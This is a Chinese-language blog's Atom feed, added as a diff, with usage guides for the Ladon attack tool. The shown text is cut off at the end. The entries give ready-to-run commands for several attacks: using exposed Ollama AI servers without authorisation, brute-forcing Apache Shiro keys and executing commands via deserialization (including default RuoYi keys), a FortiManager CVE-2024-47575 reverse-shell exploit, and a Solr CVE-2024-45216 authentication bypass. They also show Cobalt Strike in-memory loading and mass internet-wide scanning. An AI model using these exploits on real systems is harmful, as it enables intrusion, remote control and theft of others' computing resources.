@@ -1,0 +1,614 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>K8哥哥’s Blog</title>
+  
+  
+  <link href="http://k8gege.org/atom.xml" rel="self"/>
+  
+  <link href="http://k8gege.org/"/>
+  <updated>2025-04-18T16:39:37.607Z</updated>
+  <id>http://k8gege.org/</id>
+  
+  <author>
+    <name>K8gege</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Ladon白嫖AI大模型 DeepSeek R1 和 Qwen 2.5</title>
+    <link href="http://k8gege.org/p/freeai.html"/>
+    <id>http://k8gege.org/p/freeai.html</id>
+    <published>2025-04-18T15:40:00.000Z</published>
+    <updated>2025-04-18T16:39:37.607Z</updated>
+    
+    <content type="html"><![CDATA[<p style="color:#fff;"> <% <span class="archive-article-date">Visit <span id="busuanzi_value_page_pv"></span></span>%></p><p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="/Ladon/freeai.html";</script><h3 id="免责声明">免责声明</h3><p>Ladon项目所涉及的技术、思路和工具仅供学习或授权渗透，非法用途后果自负。</p><h3 id="漏洞编号">漏洞编号</h3><h3 id="影响版本">影响版本</h3><p>Ollama部署大模型<br>DeepSeek R1<br>Qwen 2.5</p><h3 id="应用指纹">应用指纹</h3><p>app=“ollama”</p><h3 id="漏洞简介">漏洞简介</h3><p>通过调用 DeepSeek R1 和 Qwen 2.5 API进行聊天，成功聊天，回显ISOK</p><h4 id="批量扫描">批量扫描</h4><p><img src="../k8img/Ladon/freeai.png" alt="使用http访问查看图片"></p><h4 id="批量结果">批量结果</h4><p>扫描1W只有478个，看来大部份还是设置授权的，单纯识别Ollama不等于能白嫖，这个和探测CMS页面存在就说有漏洞同理，目标刚好有，小白就认为扫描器牛逼，实际上靠的是运气。等过段时间目标补丁打得差不多，通过版本识别漏洞的工具，再扫提示有洞，但根本打不了。Ladon百分之99探测漏洞模块，均通过漏洞原理，能扫到大部分就能EXP打，个别漏洞采用版本，不确定存在漏洞会加?号<br><img src="/k8img/Ladon/deepseek.png" alt="使用http访问查看图片"></p><h3 id="CS使用POC">CS使用POC</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; Ladon http://192.168.1.8 FreeAI</span><br></pre></td></tr></table></figure><p>PS: Cobalt Strike内存加载FreeAI</p><h3 id="指定URL">指定URL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon http://192.168.1.8 FreeAI</span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/freeai.png" alt="使用http访问查看图片"></p><h3 id="指定IP">指定IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8 FreeAI</span><br></pre></td></tr></table></figure><h3 id="批量URL">批量URL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon url.txt FreeAI</span><br></pre></td></tr></table></figure><p>PS：TXT可存放IP、IP:Port、URL等格式</p><p><img src="/k8img/Ladon/freeai.png" alt="使用http访问查看图片"></p><h3 id="批量IP">批量IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip.txt FreeAI</span><br><span class="line">Ladon noping ip.txt FreeAI</span><br></pre></td></tr></table></figure><h3 id="指定C段">指定C段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 FreeAI</span><br><span class="line">Ladon noping 192.168.1.8/24 FreeAI</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/24 FreeAI</span><br><span class="line">Ladon noping 192.168.1.8/24 FreeAI</span><br></pre></td></tr></table></figure><h3 id="指定B段">指定B段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/b FreeAI</span><br><span class="line">Ladon noping 192.168.1.8/b FreeAI</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/b FreeAI</span><br><span class="line">Ladon noping 192.168.1.8/b FreeAI</span><br></pre></td></tr></table></figure><h3 id="指定A段">指定A段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/a FreeAI</span><br><span class="line">Ladon noping 192.168.1.8/a FreeAI</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/a FreeAI</span><br><span class="line">Ladon noping 192.168.1.8/a FreeAI</span><br></pre></td></tr></table></figure><h3 id="批量C段">批量C段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip24.txt FreeAI</span><br><span class="line">Ladon ipc.txt FreeAI</span><br><span class="line"></span><br><span class="line">Ladon noping ip24.txt FreeAI</span><br><span class="line">Ladon noping ipc.txt FreeAI</span><br></pre></td></tr></table></figure><p>PS: TXT存放多个目标的C段IP</p><h3 id="批量B段">批量B段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip16.txt FreeAI</span><br><span class="line">Ladon noping ip16.txt FreeAI</span><br></pre></td></tr></table></figure><p>PS: TXT存放多个目标的B段IP</p><h3 id="批量网段">批量网段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon cidr.txt FreeAI</span><br><span class="line">Ladon noping cidr.txt FreeAI</span><br></pre></td></tr></table></figure><p>PS: TXT存放各种IP网段，全网无差别扫描</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p style=&quot;color:#fff;&quot;&gt; 
+&lt;% 
+&lt;span class=&quot;archive-article-date&quot;&gt;
+Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
+&lt;/span&gt;
+%&gt;
+&lt;/p&gt;
+&lt;p&gt;========</summary>
+      
+    
+    
+    
+    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+    <category term="DeepSeek" scheme="http://k8gege.org/tags/DeepSeek/"/>
+    
+    <category term="Qwen 2.5" scheme="http://k8gege.org/tags/Qwen-2-5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ladon ShiroEXP高效爆破Key 反序列化漏洞复现</title>
+    <link href="http://k8gege.org/p/shiroexp.html"/>
+    <id>http://k8gege.org/p/shiroexp.html</id>
+    <published>2024-12-10T15:40:00.000Z</published>
+    <updated>2025-04-18T15:24:57.730Z</updated>
+    
+    <content type="html"><![CDATA[<p style="color:#fff;"> <% <span class="archive-article-date">Visit <span id="busuanzi_value_page_pv"></span></span>%></p><p>Ladon ShiroEXP 高效爆破Key Shiro反序列化漏洞复现</p><h3 id="功能简介">功能简介</h3><p>支持执行自定义payload (ysoserial)一键爆破Shiro Key 自动CBC/GCM 支持keys.txt多线程检测1100+仅需几十秒一键检测 反序列化 利用链Shiro高版本GCM回显命令执行(不出网)Shiro低版本CBC回显命令执行(不出网)输出ShiroExp.log<p>命令执行-回显利用链<br>CommonsCollectionsK2<br>CommonsBeanutils2<br>Jdk7u21<br>Jdk8u20<br>CommonsBeanutils1<br>CommonsCollectionsK1</p></p><h3 id="Shiro反序列化漏洞原理">Shiro反序列化漏洞原理</h3><p>由于Apache Shiro cookie中通过 AES-128-CBC、AES-128-GCM 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><h3 id="爆破Shiro-Key">爆破Shiro Key</h3><p>内置1000+默认Key，多线程一键爆破(自动AES、GCM加密)，几秒验证<br>支持对Shiro-550（硬编码秘钥）和Shiro-721（Padding Oracle）的一键化检测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 check</span><br><span class="line">Ladon ShiroKey http://192.168.1.8</span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/exp/shiro/key.png" alt="使用http访问查看图片"></p><p><img src="/k8img/Ladon/exp/shiro/key2.png" alt="使用http访问查看图片"></p><h3 id="爆破利用链">爆破利用链</h3><p>内置1000+默认Key，多线程一键爆破(自动AES-CBC、AES-GCM加密)，几秒验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc check</span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm check</span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/exp/shiro/gadget.png" alt="使用http访问查看图片"></p><h3 id="ShiroEXP-漏洞利用">ShiroEXP 漏洞利用</h3><p>使用爆破出来的对应利用链，无回显执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc CommonsBeanutils1 <span class="built_in">whoami</span></span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm CommonsBeanutils1 <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/exp/shiro/exp.png" alt="使用http访问查看图片"></p><h3 id="Rouyi-4-x漏洞利用">Rouyi 4.x漏洞利用</h3><p>Rouyi4Exp只针对4.X默认Key(zSyK5Kp6PZAAjlT+eeNMlg==)，利用链CommonsBeanutils1的一键利用。对于其它版本，最好还是使用ShiroExp模块，这个针对所有使用Shiro框架的CMS</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ladon Rouyi4Exp http://192.168.1.8 <span class="built_in">whoami</span></span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc CommonsBeanutils1 <span class="built_in">whoami</span></span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm CommonsBeanutils1 <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/exp/shiro/Rouyi4Exp.png" alt="使用http访问查看图片"></p><h3 id="执行自定义payload">执行自定义payload</h3><h4 id="ysoserial生成payload">ysoserial生成payload</h4><p>Shiro利用链CommonsBeanutils1，所以payload必须使用CommonsBeanutils1封装，并不是任意class都能执行，要不然还爆破利用链的干嘛？因为目标引用了这个库，才能反序列化执行命令，并不是单纯知道KEY，就能执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">&quot;touch /tmp/k8gege.txt&quot;</span> &gt; yso.ser</span><br></pre></td></tr></table></figure><p>使用对应KEY 对应加密方式 执行payload 如shiro低版本 AES-CBC对应KEY加密，再发送加密后的cookie，所以这是为什么直接抓别人包，发送YSO生成payload无效的原因，一定要了解整个EXP通信原理，而不是表面理解，只知道通过remberME字段反序列化，可是让自己构造个payload，都不知道要封装成对应的，随意找个class当然不行啊，除非是原生JAVA，且支持所有java版本的class，明显没有，存在通用反序化payload的话就不需要ysoserial工具了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.50.223:8080 kPH+bIxk5D2deZiIxcaaaA== cbc diy yso.ser</span><br></pre></td></tr></table></figure><h4 id="检测是否执行成功">检测是否执行成功</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.50.223:8080 kPH+bIxk5D2deZiIxcaaaA== cbc CommonsCollectionsK1 <span class="string">&quot;ls /tmp&quot;</span></span><br><span class="line"></span><br><span class="line">http://192.168.50.223:8080 IsShiro</span><br><span class="line">Exp...</span><br><span class="line">Res:</span><br><span class="line">hsperfdata_root</span><br><span class="line">k8gege.txt ---</span><br><span class="line">tomcat-docbase.6132634819123728545.8080</span><br><span class="line">tomcat.2080411627486188816.8080</span><br></pre></td></tr></table></figure><h4 id="影响版本">影响版本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Apache Shiro &lt; 1.2.4</span><br><span class="line"></span><br><span class="line">RuoYi 版本号 对象版本的默认AES密钥</span><br><span class="line">4.6.1-4.3.1 zSyK5Kp6PZAAjlT+eeNMlg==</span><br><span class="line">3.4-及以下 fCq+/xW488hMTCD+cmJ3aQ==</span><br></pre></td></tr></table></figure><h3 id="Shiro框架检测">Shiro框架检测</h3><p>模块IsShiro，Cobalt Strike下命令用法一致,但无需上传EXE至目标，内存加载，隐蔽性高</p><h3 id="指定URL">指定URL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon http://192.168.1.8 IsShiro</span><br></pre></td></tr></table></figure><h3 id="指定IP">指定IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8 IsShiro</span><br></pre></td></tr></table></figure><h3 id="批量URL">批量URL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon url.txt IsShiro</span><br></pre></td></tr></table></figure><p>PS：TXT可存放IP、IP:Port、URL等格式</p><h3 id="批量IP">批量IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip.txt IsShiro</span><br><span class="line">Ladon noping ip.txt IsShiro</span><br></pre></td></tr></table></figure><h3 id="指定C段">指定C段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/24 IsShiro</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/24 IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/24 IsShiro</span><br></pre></td></tr></table></figure><h3 id="指定B段">指定B段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/b IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/b IsShiro</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/b IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/b IsShiro</span><br></pre></td></tr></table></figure><h3 id="指定A段">指定A段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/a IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/a IsShiro</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/a IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/a IsShiro</span><br></pre></td></tr></table></figure><h3 id="批量C段">批量C段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip24.txt IsShiro</span><br><span class="line">Ladon ipc.txt IsShiro</span><br><span class="line"></span><br><span class="line">Ladon noping ip24.txt IsShiro</span><br><span class="line">Ladon noping ipc.txt IsShiro</span><br></pre></td></tr></table></figure><p>PS: TXT存放多个目标的C段IP</p><h3 id="批量B段">批量B段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip16.txt IsShiro</span><br><span class="line">Ladon noping ip16.txt IsShiro</span><br></pre></td></tr></table></figure><p>PS: TXT存放多个目标的B段IP</p><h3 id="批量网段">批量网段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon cidr.txt IsShiro</span><br><span class="line">Ladon noping cidr.txt IsShiro</span><br></pre></td></tr></table></figure><p>PS: TXT存放各种IP网段，全网无差别扫描</p><h3 id="更多功能-使用教程">更多功能 使用教程</h3><p><a href="http://k8gege.org/Ladon/">http://k8gege.org/Ladon/</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p style=&quot;color:#fff;&quot;&gt; 
+&lt;% 
+&lt;span class=&quot;archive-article-date&quot;&gt;
+Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
+&lt;/span&gt;
+%&gt;
+&lt;/p&gt;
+&lt;p&gt;Ladon Sh</summary>
+      
+    
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    <category term="EXP" scheme="http://k8gege.org/categories/EXP/"/>
+    
+    
+    <category term="EXP" scheme="http://k8gege.org/tags/EXP/"/>
+    
+    <category term="Shiro" scheme="http://k8gege.org/tags/Shiro/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>FortiManager CVE-2024-47575 RCE漏洞复现</title>
+    <link href="http://k8gege.org/p/CVE-2024-47575.html"/>
+    <id>http://k8gege.org/p/CVE-2024-47575.html</id>
+    <published>2024-11-20T15:40:00.000Z</published>
+    <updated>2025-04-18T15:24:45.454Z</updated>
+    
+    <content type="html"><![CDATA[<p style="color:#fff;"> <% <span class="archive-article-date">Visit <span id="busuanzi_value_page_pv"></span></span>%></p><p>Ladon信息收集、资产探测、WhatCMS识别 飞塔FortiManager</p><p><img src="/k8img/Ladon/cms/fortimanager.png" alt="使用http访问查看图片"></p><h3 id="cve-2024-47575-漏洞复现-反弹Shell">cve-2024-47575 漏洞复现 反弹Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LadonGUI---NetCat---监听4444</span><br><span class="line">python CVE-2024-47575.py --target 192.168.1.110 --lhost 192.168.1.8 --lport 4444 --action exploit</span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/exp/cve_2024_47575.png" alt="使用http访问查看图片"></p><h4 id="影响版本">影响版本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">FortiManager 7.6.0</span><br><span class="line">FortiManager 7.4.0 through 7.4.4</span><br><span class="line">FortiManager 7.2.0 through 7.2.7</span><br><span class="line">FortiManager 7.0.0 through 7.0.12</span><br><span class="line">FortiManager 6.4.0 through 6.4.14</span><br><span class="line">FortiManager 6.2.0 through 6.2.12</span><br><span class="line">FortiManager Cloud 7.4.1 through 7.4.4</span><br><span class="line">FortiManager Cloud 7.2.1 through 7.2.7</span><br><span class="line">FortiManager Cloud 7.0.1 through 7.0.12</span><br><span class="line">FortiManager Cloud 6.4</span><br></pre></td></tr></table></figure><p><a href="https://github.com/watchtowrlabs/Fortijump-Exploit-CVE-2024-47575">https://github.com/watchtowrlabs/Fortijump-Exploit-CVE-2024-47575</a></p><h3 id="模块名称">模块名称</h3><p>WhatCMS、CMS、CmsInfo等，Cobalt Strike下用法一致，输入URL，仅识别URL对应指纹，输入非URL时，会探测常见CMS网站、网络设备、打印机、路由器、防火墙、VPN等，由于端口多速度慢，但收集的资产会更全(前提是目标有)</p><h3 id="指定URL">指定URL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon http://192.168.1.8 CMS</span><br><span class="line">Ladon http://192.168.1.8 WhatCMS</span><br></pre></td></tr></table></figure><h3 id="指定IP">指定IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8 CMS</span><br><span class="line">Ladon 192.168.1.8 WhatCMS</span><br></pre></td></tr></table></figure><h3 id="批量URL">批量URL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon url.txt CMS</span><br></pre></td></tr></table></figure><p>PS：TXT可存放IP、IP:Port、URL等格式</p><h3 id="批量IP">批量IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip.txt WhatCMS</span><br><span class="line">Ladon noping ip.txt CMS</span><br></pre></td></tr></table></figure><h3 id="指定C段">指定C段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 WhatCMS</span><br><span class="line">Ladon noping 192.168.1.8/24 CMS</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/24 WhatCMS</span><br><span class="line">Ladon noping 192.168.1.8/24 CMS</span><br></pre></td></tr></table></figure><h3 id="指定B段">指定B段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/b WhatCMS</span><br><span class="line">Ladon noping 192.168.1.8/b CMS</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/b WhatCMS</span><br><span class="line">Ladon noping 192.168.1.8/b CMS</span><br></pre></td></tr></table></figure><h3 id="指定A段">指定A段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/a WhatCMS</span><br><span class="line">Ladon noping 192.168.1.8/a CMS</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/a CMS</span><br><span class="line">Ladon noping 192.168.1.8/a CMS</span><br></pre></td></tr></table></figure><h3 id="批量C段">批量C段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip24.txt CMS</span><br><span class="line">Ladon ipc.txt CMS</span><br><span class="line"></span><br><span class="line">Ladon noping ip24.txt CMS</span><br><span class="line">Ladon noping ipc.txt CMS</span><br></pre></td></tr></table></figure><p>PS: TXT存放多个目标的C段IP</p><h3 id="批量B段">批量B段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip16.txt CMS</span><br><span class="line">Ladon noping ip16.txt CMS</span><br></pre></td></tr></table></figure><p>PS: TXT存放多个目标的B段IP</p><h3 id="批量网段">批量网段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon cidr.txt CMS</span><br><span class="line">Ladon noping cidr.txt CMS</span><br></pre></td></tr></table></figure><p>PS: TXT存放各种IP网段，全网无差别扫描</p><h3 id="更多功能-使用教程">更多功能 使用教程</h3><p><a href="http://k8gege.org/Ladon/">http://k8gege.org/Ladon/</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p style=&quot;color:#fff;&quot;&gt; 
+&lt;% 
+&lt;span class=&quot;archive-article-date&quot;&gt;
+Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
+&lt;/span&gt;
+%&gt;
+&lt;/p&gt;
+&lt;p&gt;Ladon信息收</summary>
+      
+    
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    <category term="EXP" scheme="http://k8gege.org/categories/EXP/"/>
+    
+    
+    <category term="CVE-2024-47575" scheme="http://k8gege.org/tags/CVE-2024-47575/"/>
+    
+    <category term="FortiManager" scheme="http://k8gege.org/tags/FortiManager/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>LadonExp CVE-2024-45216 漏洞复现批量扫描教程</title>
+    <link href="http://k8gege.org/p/CVE-2024-45216.html"/>
+    <id>http://k8gege.org/p/CVE-2024-45216.html</id>
+    <published>2024-11-01T15:40:00.000Z</published>
+    <updated>2025-04-18T15:24:44.676Z</updated>
+    
+    <content type="html"><![CDATA[<h1>Ladon CVE-2024-45216 影响版本 Apache Solr 5.3.0 &lt;= Apache Solr &lt; 8.11.4  9.0.0 &lt;= Apache Solr &lt; 9.7.0</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/CVE-2024-45216.html";</script><p>LadonEXP一键生成Poc/Exp，批量漏洞挖掘，快速获取权限。使用Ladon可对C段、B段、A段、全网批量扫描，0day/1day/Nday快速利用。</p><h3 id="免责声明">免责声明</h3><p>Ladon项目所涉及的技术、思路和工具仅供学习或授权渗透，非法用途后果自负。</p><h3 id="漏洞编号">漏洞编号</h3><p>CVE-2024-45216</p><h3 id="影响版本">影响版本</h3><p>Apache Solr 5.3.0 &lt;= Apache Solr &lt; 8.11.4  9.0.0 &lt;= Apache Solr &lt; 9.7.0</p><h3 id="应用指纹">应用指纹</h3><p>app=“Apache Solr”</p><h3 id="漏洞简介">漏洞简介</h3><p>Apache Solr 5.3.0至8.11.4之前版本和9.0.0至9.7.0之前版本存在安全漏洞，该漏洞源于存在身份验证不当漏洞，从而可使用虚假URL路径结尾绕过身份验证。</p><h3 id="Payload">Payload</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /solr/admin/info/properties:/admin/info/key</span><br><span class="line">Host: 192.168.1.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>PS: 使用LadonExp填上对应内容，即可生成POC/EXP</p><h3 id="POC独立使用">POC独立使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2024-45216.exe http://192.168.1.8</span><br></pre></td></tr></table></figure><p>PS: 部分https站点需Ladon调用扫描</p><p><img src="/k8img/Ladon/exp/CVE-2024-45216/poc.png" alt="使用http访问查看图片"></p><h3 id="EXP执行命令">EXP执行命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2024-45216.exe http://192.168.1.8 <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p>PS: 将payload中的cmd命令如whoami替换成$cmd$ 即可生成EXP</p><h3 id="CS使用POC">CS使用POC</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; execute-assembly C:\Ladon\CVE-2024-45216.exe http://192.168.1.8</span><br></pre></td></tr></table></figure><p>PS: Cobalt Strike内存加载CVE-2024-45216.exe</p><h3 id="指定URL">指定URL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon http://192.168.1.8 CVE-2024-45216.exe</span><br><span class="line">Ladon http://192.168.1.8 CVE-2024-45216.dll</span><br></pre></td></tr></table></figure><h3 id="指定IP">指定IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 